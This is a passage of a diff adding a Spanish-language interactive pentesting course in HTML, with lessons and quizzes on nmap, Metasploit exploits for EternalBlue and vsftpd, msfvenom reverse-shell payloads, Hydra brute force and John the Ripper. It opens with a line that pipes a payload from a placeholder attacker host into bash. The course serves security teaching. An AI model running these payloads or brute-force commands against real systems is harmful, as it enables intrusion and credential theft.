+                    <span class="command">wget -O- http://IP_ATACANTE/payload.sh | bash</span>
+                </div>
+                
+                <h3>Lección 3: Compartir Archivos por la Red en Máquinas Windows</h3>
+                <p>En máquinas Windows no podemos usar curl ni wget, así que necesitamos otro método para transferir archivos.</p>
+                
+                <div class="code-block">
+                    <span class="comment"># En la máquina Windows:</span><br>
+                    <span class="command">certutil -urlcache -f http://IP_KALI/archivo.txt archivo.txt</span>
+                </div>
+                
+                <p>La herramienta certutil es una herramienta ya instalada en Windows que podemos usar para transferir archivos.</p>
+                
+                <h3>Lección 4: Reconocimiento de la red con ARP-SCAN y NETDISCOVER</h3>
+                <p>Para encontrar equipos conectados en nuestra red privada, tenemos varias herramientas:</p>
+                
+                <div class="code-block">
+                    <span class="comment"># arp-scan</span><br>
+                    <span class="command">arp-scan -I eth0 --localnet</span><br><br>
+                    
+                    <span class="comment"># netdiscover</span><br>
+                    <span class="command">netdiscover -i eth0 -r 192.168.1.0/24</span><br><br>
+                    
+                    <span class="comment"># nmap (escaneo de hosts)</span><br>
+                    <span class="command">nmap -sn 192.168.1.0/24</span>
+                </div>
+                
+                <p>Un TTL superior a 100 en un ping indica que probablemente es una máquina Windows (TTL típico: 128), mientras que un TTL ≤ 64 indica probablemente Linux/Unix.</p>
+                
+                <h3>Lección 5: Escaneos Básicos con Nmap</h3>
+                <p>Nmap es una herramienta imprescindible para escanear puertos y obtener información de los hosts.</p>
+                
+                <div class="code-block">
+                    <span class="command">nmap -p- --open -sS -sC -sV --min-rate 2000 -n -Pn -vvv -oN resultado.txt 192.168.1.25</span>
+                </div>
+                
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Parámetro</th>
+                                <th>Descripción</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>-p-</code></td>
+                                <td>Escanea todos los puertos posibles</td>
+                            </tr>
+                            <tr>
+                                <td><code>--open</code></td>
+                                <td>Muestra solo puertos abiertos</td>
+                            </tr>
+                            <tr>
+                                <td><code>-sS</code></td>
+                                <td>Escaneo SYN, más rápido y sigiloso</td>
+                            </tr>
+                            <tr>
+                                <td><code>-sC</code></td>
+                                <td>Ejecuta scripts por defecto para obtener más información</td>
+                            </tr>
+                            <tr>
+                                <td><code>-sV</code></td>
+                                <td>Detecta versiones de servicios</td>
+                            </tr>
+                            <tr>
+                                <td><code>-n</code></td>
+                                <td>No realiza resolución DNS, más rápido</td>
+                            </tr>
+                            <tr>
+                                <td><code>-Pn</code></td>
+                                <td>No hace ping, asume que el host está activo</td>
+                            </tr>
+                            <tr>
+                                <td><code>-oN</code></td>
+                                <td>Guarda la salida en formato normal en un archivo</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                
+                <h3>Lección 6: Detectar Vulnerabilidades Con Nmap</h3>
+                <p>Podemos usar nmap para detectar vulnerabilidades conocidas:</p>
+                
+                <div class="code-block">
+                    <span class="command">nmap --script "vuln" -p 445 192.168.1.25</span>
+                </div>
+                
+                <p>Un CVE (Common Vulnerabilities and Exposures) es un identificador único para vulnerabilidades públicas. Por ejemplo, CVE-2017-0143 se refiere a la vulnerabilidad EternalBlue en Windows.</p>
+                
+                <h3>Lección 7: Escaneo de Puertos bajo el Protocolo UDP</h3>
+                <p>Además de TCP, también podemos escanear puertos UDP:</p>
+                
+                <div class="code-block">
+                    <span class="command">nmap -sU --top-ports 200 192.168.1.120</span>
+                </div>
+                
+                <p>La principal diferencia entre TCP y UDP es que TCP es orientado a conexión y más fiable, mientras que UDP es sin conexión y más rápido.</p>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-question-circle"></i> Test de Autoevaluación</h2>
+                
+                <div class="quiz">
+                    <div class="quiz-header">
+                        <h3>Test del Módulo 2</h3>
+                        <span>Preguntas: <span id="q2-count">0</span>/7</span>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>1. ¿Cuál es el comando para iniciar un servidor HTTP con Python en el puerto 80?</strong></p>
+                        <ul class="options">
+                            <li class="option">python -m server 80</li>
+                            <li class="option" data-correct="true">python3 -m http.server 80</li>
+                            <li class="option">python http.server -p 80</li>
+                            <li class="option">python3 start http 80</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! El comando correcto es <code>python3 -m http.server 80</code>.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. El comando correcto es <code>python3 -m http.server 80</code>.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>2. ¿Qué herramienta se utiliza en Windows para transferir archivos desde un servidor HTTP?</strong></p>
+                        <ul class="options">
+                            <li class="option">wget</li>
+                            <li class="option">curl</li>
+                            <li class="option" data-correct="true">certutil</li>
+                            <li class="option">powershell</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! La herramienta <code>certutil</code> se utiliza en Windows para transferir archivos desde un servidor HTTP.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. La herramienta <code>certutil</code> se utiliza en Windows para transferir archivos desde un servidor HTTP.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>3. ¿Qué parámetro de netcat activa el modo escucha?</strong></p>
+                        <ul class="options">
+                            <li class="option">-n</li>
+                            <li class="option" data-correct="true">-l</li>
+                            <li class="option">-v</li>
+                            <li class="option">-p</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! El parámetro <code>-l</code> activa el modo escucha en netcat.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. El parámetro <code>-l</code> activa el modo escucha en netcat.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>4. ¿Qué herramienta se puede usar para encontrar equipos conectados en una red privada?</strong></p>
+                        <ul class="options">
+                            <li class="option">ping</li>
+                            <li class="option">ifconfig</li>
+                            <li class="option" data-correct="true">arp-scan</li>
+                            <li class="option">traceroute</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! <code>arp-scan</code> es una herramienta que se puede usar para encontrar equipos conectados en una red privada.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. <code>arp-scan</code> es una herramienta que se puede usar para encontrar equipos conectados en una red privada.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>5. ¿Qué indica un TTL superior a 100 en un ping?</strong></p>
+                        <ul class="options">
+                            <li class="option">El host está inaccesible</li>
+                            <li class="option">El host es un router</li>
+                            <li class="option" data-correct="true">El host probablemente ejecuta Windows</li>
+                            <li class="option">El host ejecuta Linux</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! Un TTL superior a 100 (típicamente 128) indica que el host probablemente ejecuta Windows.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. Un TTL superior a 100 (típicamente 128) indica que el host probablemente ejecuta Windows.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>6. ¿Qué parámetro de nmap muestra solo puertos abiertos?</strong></p>
+                        <ul class="options">
+                            <li class="option">-p-</li>
+                            <li class="option" data-correct="true">--open</li>
+                            <li class="option">-sS</li>
+                            <li class="option">-sV</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! El parámetro <code>--open</code> muestra solo puertos abiertos en nmap.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. El parámetro <code>--open</code> muestra solo puertos abiertos en nmap.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>7. ¿Qué es un CVE?</strong></p>
+                        <ul class="options">
+                            <li class="option">Un tipo de ataque de fuerza bruta</li>
+                            <li class="option">Una herramienta de escaneo de puertos</li>
+                            <li class="option" data-correct="true">Un identificador único para vulnerabilidades públicas</li>
+                            <li class="option">Un protocolo de transferencia de archivos</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! CVE (Common Vulnerabilities and Exposures) es un identificador único para vulnerabilidades públicas.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. CVE (Common Vulnerabilities and Exposures) es un identificador único para vulnerabilidades públicas.
+                        </div>
+                    </div>
+                    
+                    <div style="text-align: right; margin-top: 1rem;">
+                        <button class="btn btn-success" id="submit-q2">Enviar respuestas</button>
+                        <button class="btn btn-warning" id="reset-q2">Reiniciar</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Página 3: Explotación de Vulnerabilidades y Fuerza Bruta -->
+        <div id="explotacion" class="page">
+            <div class="page-header">
+                <h1 class="page-title">Módulo 3: Explotación de Vulnerabilidades y Fuerza Bruta</h1>
+                <span class="badge">Avanzado</span>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-info-circle"></i> Resumen del Módulo</h2>
+                <p>Este módulo se centra en la explotación de vulnerabilidades identificadas durante las fases de escaneo y reconocimiento, así como en los ataques de fuerza bruta para obtener acceso a sistemas. Aprenderás a utilizar Metasploit Framework, generar payloads personalizados con Msfvenom, y realizar ataques de fuerza bruta con herramientas como Hydra y John the Ripper. Estas técnicas son fundamentales para demostrar el impacto real de las vulnerabilidades encontradas.</p>
+                
+                <div class="card">
+                    <p><strong>Objetivos de aprendizaje:</strong> Al finalizar este módulo, podrás:</p>
+                    <ul>
+                        <li>Utilizar Metasploit Framework para explotar vulnerabilidades</li>
+                        <li>Generar payloads personalizados con Msfvenom</li>
+                        <li>Realizar ataques de fuerza bruta con Hydra</li>
+                        <li>Crackear contraseñas locales con John the Ripper</li>
+                        <li>Aplicar estas técnicas en escenarios de pentesting realistas</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-rocket"></i> Explotación de Vulnerabilidades</h2>
+                
+                <h3>Lección 1: Uso Básico de Metasploit – Explotación EternalBlue en Windows</h3>
+                <p>Metasploit Framework es la herramienta más poderosa para la explotación de vulnerabilidades.</p>
+                
+                <div class="code-block">
+                    <span class="comment"># 1. Buscar el exploit por CVE</span><br>
+                    <span class="command">search CVE-2017-0143</span><br><br>
+                    
+                    <span class="comment"># 2. Seleccionar el exploit</span><br>
+                    <span class="command">use 0</span> <span class="comment"># o el número del exploit</span><br><br>
+                    
+                    <span class="comment"># 3. Ver opciones requeridas</span><br>
+                    <span class="command">show options</span><br><br>
+                    
+                    <span class="comment"># 4. Configurar el host objetivo</span><br>
+                    <span class="command">set RHOSTS 192.168.1.25</span><br><br>
+                    
+                    <span class="comment"># 5. Ejecutar el exploit</span><br>
+                    <span class="command">exploit</span> <span class="comment"># o run</span>
+                </div>
+                
+                <div class="card">
+                    <p><strong>Componentes clave de Metasploit:</strong></p>
+                    <ul>
+                        <li><strong>Exploit:</strong> Código que aprovecha una vulnerabilidad específica</li>
+                        <li><strong>Payload:</strong> Código que se ejecuta después de la explotación (lo más importante)</li>
+                        <li><strong>Reverse Shell:</strong> Conexión desde la víctima al atacante</li>
+                        <li><strong>Multi/Handler:</strong> Módulo que espera conexiones entrantes (alternativa a netcat)</li>
+                    </ul>
+                </div>
+                
+                <h3>Lección 2: Uso Básico de Metasploit – Explotación vsftpd en Linux</h3>
+                <p>Algunas vulnerabilidades no tienen CVE asociado, por lo que se debe buscar por servicio y versión.</p>
+                
+                <div class="code-block">
+                    <span class="comment"># Buscar por nombre de servicio y versión</span><br>
+                    <span class="command">search vsftpd 2.3.4</span><br><br>
+                    
+                    <span class="comment"># Seleccionar y configurar el exploit</span><br>
+                    <span class="command">use exploit/unix/ftp/vsftpd_234_backdoor</span><br>
+                    <span class="command">set RHOSTS 192.168.1.30</span><br>
+                    <span class="command">run</span>
+                </div>
+                
+                <div class="card">
+                    <p><strong>Servicios comunes y sus puertos:</strong></p>
+                    <ul>
+                        <li><strong>Puerto 21:</strong> Servicio vsFTPd</li>
+                        <li><strong>Puerto 22:</strong> Servicio SSH</li>
+                        <li><strong>Puerto 80:</strong> Servicio HTTP</li>
+                    </ul>
+                </div>
+                
+                <h3>Lección 3: Msfvenom – Generar Nuestros Propios Payloads</h3>
+                <p>Msfvenom es una herramienta para generar payloads personalizados que pueden ser utilizados en ataques de explotación.</p>
+                
+                <div class="code-block">
+                    <span class="command">msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=443 -f exe -o archivo_malicioso.exe</span>
+                </div>
+                
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Parámetro</th>
+                                <th>Descripción</th>
+                                <th>Ejemplo</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>-p</code></td>
+                                <td>Payload (código malicioso)</td>
+                                <td>windows/x64/meterpreter/reverse_tcp</td>
+                            </tr>
+                            <tr>
+                                <td><code>LPORT</code></td>
+                                <td>Puerto de escucha en el atacante</td>
+                                <td>443 (HTTPS)</td>
+                            </tr>
+                            <tr>
+                                <td><code>-f</code></td>
+                                <td>Formato de salida</td>
+                                <td>exe, php, asp, etc.</td>
+                            </tr>
+                            <tr>
+                                <td><code>-o</code></td>
+                                <td>Nombre del archivo de salida</td>
+                                <td>archivo_malicioso.exe</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                
+                <h3>Proceso completo de explotación con Msfvenom:</h3>
+                <ol>
+                    <li>Generar el payload con Msfvenom</li>
+                    <li>Compartir el payload con la víctima (HTTP, FTP, etc.)</li>
+                    <li>Poner al atacante a la escucha con multi/handler</li>
+                    <li>Esperar a que la víctima ejecute el payload</li>
+                    <li>Obtener acceso remoto</li>
+                </ol>
+                
+                <div class="code-block">
+                    <span class="comment"># 1. Generar payload</span><br>
+                    <span class="command">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.26 LPORT=443 -f exe -o payload.exe</span><br><br>
+                    
+                    <span class="comment"># 2. Poner a la escucha el multi/handler</span><br>
+                    <span class="command">use exploit/multi/handler</span><br>
+                    <span class="command">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br>
+                    <span class="command">set LHOST 192.168.1.26</span><br>
+                    <span class="command">set LPORT 443</span><br>
+                    <span class="command">run</span>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-lock"></i> Ataques de Fuerza Bruta</h2>
+                
+                <h3>Lección 4: Uso de Hydra – Ataques de Fuerza Bruta a Contraseñas (SSH y FTP)</h3>
+                <p>Hydra es una herramienta rápida y flexible para ataques de fuerza bruta contra múltiples protocolos.</p>
+                
+                <div class="code-block">
+                    <span class="comment"># Ataque a SSH con usuario conocido</span><br>
+                    <span class="command">hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.23</span><br><br>
+                    
+                    <span class="comment"># Ataque a FTP con usuario conocido</span><br>
+                    <span class="command">hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.23</span>
+                </div>
+                
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Parámetro</th>
+                                <th>Uso</th>
+                                <th>Nota</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>-l</code></td>
+                                <td>Usuario específico (lowercase L)</td>
+                                <td>Usar cuando conoces el usuario</td>
+                            </tr>
+                            <tr>
+                                <td><code>-L</code></td>
+                                <td>Archivo con lista de usuarios (uppercase L)</td>
+                                <td>Para ataques a usuarios</td>
+                            </tr>
+                            <tr>
+                                <td><code>-p</code></td>
+                                <td>Contraseña específica (lowercase P)</td>
+                                <td>Para ataques con contraseña conocida</td>
+                            </tr>
+                            <tr>
+                                <td><code>-P</code></td>
+                                <td>Archivo con lista de contraseñas (uppercase P)</td>
+                                <td>Para ataques a contraseñas</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                
+                <h3>Lección 5: Uso de Hydra – Ataques de Fuerza Bruta a Usuarios (SSH y FTP)</h3>
+                <p>Para ataques donde conocemos la contraseña pero no el usuario:</p>
+                
+                <div class="code-block">
+                    <span class="comment"># Ataque a usuarios con contraseña conocida</span><br>
+                    <span class="command">hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://192.168.1.23</span>
+                </div>
+                
+                <h3>Lección 6: Uso de Hydra – Ataques de Fuerza Bruta a Paneles de Login Web</h3>
+                <p>Para ataques a formularios web, es necesario capturar la petición con Burp Suite o similar.</p>
+                
+                <div class="code-block">
+                    <span class="command">hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.24 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password."</span>
+                </div>
+                
+                <div class="card">
+                    <p><strong>Elementos clave en ataques web:</strong></p>
+                    <ul>
+                        <li><strong>http-post-form:</strong> Indica que es un formulario POST</li>
+                        <li><strong>^USER^ y ^PASS^:</strong> Marcadores que Hydra reemplaza con valores del diccionario</li>
+                        <li><strong>Mensaje de error:</strong> Lo que aparece cuando el login falla (para detectar intentos fallidos)</li>
+                    </ul>
+                </div>
+                
+                <h3>Lección 7: Ataques de Fuerza Bruta con Metasploit</h3>
+                <p>Metasploit también puede realizar ataques de fuerza bruta.</p>
+                
+                <div class="code-block">
+                    <span class="comment"># Buscar módulo de fuerza bruta para SSH</span><br>
+                    <span class="command">search ssh_login</span><br><br>
+                    
+                    <span class="comment"># Usar el módulo</span><br>
+                    <span class="command">use auxiliary/scanner/ssh/ssh_login</span><br><br>
+                    
+                    <span class="comment"># Configurar opciones</span><br>
+                    <span class="command">set USERNAME juan</span><br>
+                    <span class="command">set RHOSTS 192.168.1.23</span><br>
+                    <span class="command">set PASS_FILE /usr/share/wordlists/rockyou.txt</span><br><br>
+                    
+                    <span class="comment"># Ejecutar el ataque</span><br>
+                    <span class="command">run</span>
+                </div>
+                
+                <h3>Lección 8: Ataques de Fuerza Bruta contra Bases de Datos</h3>
+                <p>Los servicios de bases de datos como MySQL son objetivos comunes para ataques de fuerza bruta.</p>
+                
+                <div class="code-block">
+                    <span class="comment"># Ataque a MySQL</span><br>
+                    <span class="command">hydra -l capybara -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.35:3306</span><br><br>
+                    
+                    <span class="comment"># Conexión a MySQL después del ataque</span><br>
+                    <span class="command">mysql -u capybara -p -h 192.168.1.35</span>
+                </div>
+                
+                <h3>Lección 9: Ataques de Fuerza Bruta en Local con John The Ripper</h3>
+                <p>John the Ripper es una herramienta para crackear contraseñas locales de archivos protegidos.</p>
+                
+                <h3>Crackeo de archivos comprimidos:</h3>
+                
+                <div class="code-block">
+                    <span class="comment"># Extraer el hash de un archivo ZIP</span><br>
+                    <span class="command">zip2john archivo.zip > hash.txt</span><br><br>
+                    
+                    <span class="comment"># Crackear el hash</span><br>
+                    <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
+                </div>
+                
+                <h3>Crackeo de bases de datos KeePass:</h3>
+                
+                <div class="code-block">
+                    <span class="comment"># Extraer el hash de una base de datos KeePass</span><br>
+                    <span class="command">keepass2john Database.kdbx > hash.txt</span><br><br>
+                    
+                    <span class="comment"># Crackear el hash</span><br>
+                    <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
+                </div>
+                
+                <h3>Crackeo de hashes directos:</h3>
+                <p>Cuando se encuentra un hash (MD5, SHA1, etc.), se puede intentar crackearlo.</p>
+                
+                <div class="code-block">
+                    <span class="comment"># Identificar el tipo de hash</span><br>
+                    <span class="command">hash-identifier</span><br><br>
+                    
+                    <span class="comment"># Crackear con tipo especificado</span><br>
+                    <span class="command">john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-question-circle"></i> Test de Autoevaluación</h2>
+                
+                <div class="quiz">
+                    <div class="quiz-header">
+                        <h3>Test del Módulo 3</h3>
+                        <span>Preguntas: <span id="q3-count">0</span>/9</span>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>1. ¿Cuál es el CVE asociado a la vulnerabilidad EternalBlue?</strong></p>
+                        <ul class="options">
+                            <li class="option">CVE-2017-0144</li>
+                            <li class="option" data-correct="true">CVE-2017-0143</li>
+                            <li class="option">CVE-2017-0142</li>
+                            <li class="option">CVE-2017-0141</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! La vulnerabilidad EternalBlue está asociada con CVE-2017-0143.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. La vulnerabilidad EternalBlue está asociada con CVE-2017-0143.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>2. ¿Qué componente de Metasploit se ejecuta después de la explotación y permite el acceso remoto?</strong></p>
+                        <ul class="options">
+                            <li class="option">Exploit</li>
+                            <li class="option" data-correct="true">Payload</li>
+                            <li class="option">Scanner</li>
+                            <li class="option">Module</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! El payload es el código que se ejecuta después de la explotación y permite el acceso remoto al sistema.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. El payload es el código que se ejecuta después de la explotación y permite el acceso remoto al sistema.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>3. ¿Cuál es el comando para generar un payload de Windows con Msfvenom?</strong></p>
+                        <ul class="options">
+                            <li class="option">msfvenom -create windows -o payload.exe</li>
+                            <li class="option">msfvenom --payload windows --output payload.exe</li>
+                            <li class="option" data-correct="true">msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o payload.exe</li>
+                            <li class="option">msfvenom generate windows payload.exe</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! El comando correcto utiliza <code>-p</code> para especificar el payload, <code>-f exe</code> para el formato y <code>-o</code> para el nombre de salida.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. El comando correcto utiliza <code>-p</code> para especificar el payload, <code>-f exe</code> para el formato y <code>-o</code> para el nombre de salida.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>4. ¿Qué parámetro de Hydra se usa para especificar un diccionario de contraseñas?</strong></p>
+                        <ul class="options">
+                            <li class="option">-l</li>
+                            <li class="option">-L</li>
+                            <li class="option" data-correct="true">-P</li>
+                            <li class="option">-p</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! El parámetro <code>-P</code> (mayúscula) se usa para especificar un archivo con diccionario de contraseñas.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. El parámetro <code>-P</code> (mayúscula) se usa para especificar un archivo con diccionario de contraseñas.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>5. ¿Qué herramienta se utiliza para capturar la petición de login de un formulario web antes de usar Hydra?</strong></p>
+                        <ul class="options">
+                            <li class="option">Wireshark</li>
+                            <li class="option" data-correct="true">Burp Suite</li>
+                            <li class="option">Nmap</li>
+                            <li class="option">Metasploit</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! Burp Suite se utiliza para interceptar y analizar las peticiones de login de formularios web.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. Burp Suite se utiliza para interceptar y analizar las peticiones de login de formularios web.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>6. ¿Qué puerto se asocia comúnmente con servicios de bases de datos MySQL?</strong></p>
+                        <ul class="options">
+                            <li class="option">21</li>
+                            <li class="option">22</li>
+                            <li class="option" data-correct="true">3306</li>
+                            <li class="option">5432</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! El puerto 3306 es el puerto por defecto para servicios MySQL.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. El puerto 3306 es el puerto por defecto para servicios MySQL.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>7. ¿Qué herramienta se utiliza para extraer el hash de un archivo ZIP antes de crackearlo con John the Ripper?</strong></p>
+                        <ul class="options">
+                            <li class="option">zip-hash</li>
+                            <li class="option">extract-zip</li>
+                            <li class="option" data-correct="true">zip2john</li>
+                            <li class="option">john-zip</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! El comando <code>zip2john archivo.zip > hash.txt</code> extrae el hash del archivo ZIP para que John the Ripper pueda procesarlo.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. El comando <code>zip2john archivo.zip > hash.txt</code> extrae el hash del archivo ZIP para que John the Ripper pueda procesarlo.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>8. ¿Qué herramienta se puede usar para identificar el tipo de hash cuando John the Ripper no lo reconoce automáticamente?</strong></p>
+                        <ul class="options">
+                            <li class="option">hash-checker</li>
+                            <li class="option">identify-hash</li>
+                            <li class="option" data-correct="true">hash-identifier</li>
+                            <li class="option">john-identify</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! La herramienta <code>hash-identifier</code> ayuda a identificar el tipo de hash cuando John the Ripper no lo reconoce automáticamente.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. La herramienta <code>hash-identifier</code> ayuda a identificar el tipo de hash cuando John the Ripper no lo reconoce automáticamente.
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>9. ¿Qué es un multi/handler en Metasploit?</strong></p>
+                        <ul class="options">
+                            <li class="option">Un exploit múltiple para varios sistemas</li>
+                            <li class="option">Un escáner de múltiples puertos</li>
+                            <li class="option" data-correct="true">Un módulo que espera conexiones entrantes de payloads</li>
+                            <li class="option">Un generador de múltiples payloads</li>
+                        </ul>
+                        <div class="feedback correct">
+                            <i class="fas fa-check"></i> ¡Correcto! El multi/handler es un módulo que espera conexiones entrantes de payloads, actuando como alternativa a netcat.
+                        </div>
+                        <div class="feedback incorrect">
+                            <i class="fas fa-times"></i> Incorrecto. El multi/handler es un módulo que espera conexiones entrantes de payloads, actuando como alternativa a netcat.
+                        </div>
+                    </div>
+                    
+                    <div style="text-align: right; margin-top: 1rem;">
+                        <button class="btn btn-success" id="submit-q3">Enviar respuestas</button>
+                        <button class="btn btn-warning" id="reset-q3">Reiniciar</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Página 4: Juegos, Simuladores, Logros y Progreso -->
+        <div id="juegos" class="page">
+            <div class="page-header">
+                <h1 class="page-title">Juegos, Simuladores y Progreso</h1>
+                <span class="badge">Práctico</span>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-gamepad"></i> Juegos Interactivos</h2>
+                
+                <h3>Emparejar Comandos</h3>
+                <p>Arrastra cada comando a su descripción correcta.</p>
+                
+                <div class="matching-game">
+                    <div class="terms">
+                        <h3>Comandos</h3>
+                        <div class="term" draggable="true" data-match="1">python3 -m http.server 80</div>
+                        <div class="term" draggable="true" data-match="2">scp archivo.txt user@host:/ruta</div>
+                        <div class="term" draggable="true" data-match="3">nmap -p- --open 192.168.1.1</div>
+                        <div class="term" draggable="true" data-match="4">hydra -l user -P pass.txt ssh://host</div>
+                        <div class="term" draggable="true" data-match="5">msfvenom -p payload -f exe</div>
+                    </div>
+                    <div class="definitions">
+                        <h3>Descripciones</h3>
+                        <div class="definition" data-match="1">Inicia un servidor web simple en el puerto 80 para compartir archivos</div>
+                        <div class="definition" data-match="2">Copia archivos de forma segura entre máquinas usando SSH</div>
+                        <div class="definition" data-match="3">Escanea todos los puertos abiertos en un host</div>
+                        <div class="definition" data-match="4">Realiza un ataque de fuerza bruta a SSH</div>
+                        <div class="definition" data-match="5">Genera un payload malicioso en formato ejecutable</div>
+                    </div>
+                </div>
+                
+                <button class="btn btn-success" id="check-matching">Verificar respuestas</button>
+                <button class="btn btn-warning" id="reset-matching">Reiniciar</button>
+            </div>
+
+            <div class="section">
+                <h2><i class="fas fa-clock"></i> Desafío Cronometrado</h2>
+                <p>¡Pon a prueba tu velocidad! Completa los comandos antes de que se acabe el tiempo.</p>
+                
+                <div class="timer" id="challenge-timer">Tiempo: 60s</div>
+                
+                <div class="quiz">
+                    <div class="question">
+                        <p><strong>1. Completa el comando para escanear todos los puertos:</strong></p>
+                        <div class="drag-area">
+                            <span>nmap</span>
+                            <span class="drop-zone" data-answer="-p-"></span>
+                            <span>192.168.1.1</span>
+                        </div>
+                        <div class="options">
+                            <div class="option" draggable="true">-p-</div>
+                            <div class="option" draggable="true">--all</div>
+                            <div class="option" draggable="true">-ports all</div>
+                            <div class="option" draggable="true">-P</div>
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>2. Completa el comando para detectar versiones de servicios:</strong></p>
+                        <div class="drag-area">
+                            <span>nmap -sS</span>
+                            <span class="drop-zone" data-answer="-sV"></span>
+                            <span>192.168.1.1</span>
+                        </div>
+                        <div class="options">
+                            <div class="option" draggable="true">-version</div>
+                            <div class="option" draggable="true">--version</div>
+                            <div class="option" draggable="true">-sV</div>
+                            <div class="option" draggable="true">-V</div>
+                        </div>
+                    </div>
+                    
+                    <div class="question">
+                        <p><strong>3. Completa el comando para no hacer ping al host:</strong></p>
+                        <div class="drag-area">
+                            <span>nmap</span>
+                            <span class="drop-zone" data-answer="-Pn"></span>
+                            <span>192.168.1.1</span>
